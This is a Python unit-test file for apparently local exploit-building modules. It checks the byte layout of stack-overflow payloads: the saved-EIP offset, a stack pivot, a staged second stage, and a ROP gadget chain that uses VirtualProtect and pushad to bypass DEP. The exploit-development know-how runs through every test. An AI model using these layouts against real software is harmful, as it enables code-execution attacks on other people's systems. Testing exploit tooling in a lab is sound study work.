from __future__ import annotations

import unittest
from struct import pack

from dep2_layout import (
    build_staged_payload,
    build_status_proof,
    first_stage_prefix_length,
)
from dep3_layout import Dep3Gadgets, build_dep3_payload


class Dep2LayoutTests(unittest.TestCase):
    def test_first_stage_prefix_includes_saved_eip_and_two_dwords(self) -> None:
        self.assertEqual(first_stage_prefix_length(268), 280)

    def test_staged_payload_uses_only_three_controlled_initial_dwords(self) -> None:
        payload = build_staged_payload(
            saved_eip_offset=8,
            pop_eax_ret=0x62501002,
            stage2_address=0x62504100,
            pivot=0x62501014,
            stage2_offset=32,
            stage2=b"CHAIN",
            proof=b"PROOF",
        )

        self.assertEqual(
            payload[8:20],
            pack("<III", 0x62501002, 0x62504100, 0x62501014),
        )
        self.assertEqual(payload[20:32], b"A" * 12)
        self.assertEqual(payload[32:], b"CHAINPROOF")

    def test_status_proof_embeds_only_the_supplied_local_witness_values(self) -> None:
        proof = build_status_proof(0x62505000, 0x1337C0DE)

        self.assertIn(pack("<I", 0x62505000), proof)
        self.assertIn(pack("<I", 0x1337C0DE), proof)
        self.assertEqual(proof[-1:], b"\xC3")

    def test_dep3_payload_uses_side_effect_gadgets_before_pushad(self) -> None:
        gadgets = Dep3Gadgets(
            pop_eax=0x62502030,
            pivot=0x62502031,
            pop_ecx_ebp_edi_eax=0x62502032,
            xchg_eax_edx=0x62502033,
            pop_ebx_ebp_eax=0x62502034,
            pop_ebp=0x62502035,
            dereference_eax_plus_10=0x62502036,
            xchg_eax_esi=0x62502037,
            add_esp_0x1c=0x62502038,
            pushad=0x62502039,
            ret=0x62502141,
            neg_eax=0x62502142,
            mov_esi_eax=0x62502143,
            xchg_eax_ebx=0x62502144,
        )
        stage2_addr = 0x62504141
        payload = build_dep3_payload(
            saved_eip_offset=8,
            stage2_address=stage2_addr,
            stage2_offset=32,
            cached_virtualprotect=0x62505151,
            proof=b"PROOF",
            gadgets=gadgets,
        )

        self.assertEqual(payload[8:20], pack("<III", gadgets.pop_eax, stage2_addr, gadgets.pivot))
        stage = payload[32:]
        words = [pack("<I", value) for value in (
            gadgets.pop_ecx_ebp_edi_eax,
            gadgets.neg_eax,
            gadgets.xchg_eax_edx,
            gadgets.xchg_eax_ebx,
            gadgets.dereference_eax_plus_10,
            gadgets.xchg_eax_esi,
            gadgets.add_esp_0x1c,
            gadgets.pushad,
        )]
        for word in words:
            self.assertIn(word, stage)
        chain_end = stage.index(b"PROOF")
        self.assertIn(pack("<I", stage2_addr + chain_end), stage)
        self.assertTrue(stage.endswith(b"PROOF" + pack("<I", 0x41414141)))


if __name__ == "__main__":
    unittest.main()
